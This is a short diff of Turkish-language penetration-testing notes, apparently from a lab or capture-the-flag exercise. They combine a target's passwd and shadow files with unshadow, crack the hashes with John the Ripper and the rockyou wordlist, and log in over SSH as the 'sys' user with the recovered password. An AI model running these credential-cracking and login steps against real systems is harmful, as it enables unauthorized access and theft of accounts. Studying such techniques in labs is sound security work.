@@ -9,4 +9,8 @@ leafpad passwd.txt (aynı işlem)
 
 unshadow shadow.txt passwd.txt > hashes.txt
 
+john hashes.txt --wordlist=/usr/share/wordlist/rockyou.txt (Şifre kırma için kullanılan kali linux içerisindeki en kapsamlı wordlist {rockyou.txt.tar ise tar xvf rockyou.txt.tar ile extract edin})
+
+ssh sys@<ip> (bunun ile bulduğunuz şifreyi girebilrisiniz belli kullanıcıya sisteme)
+
 ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
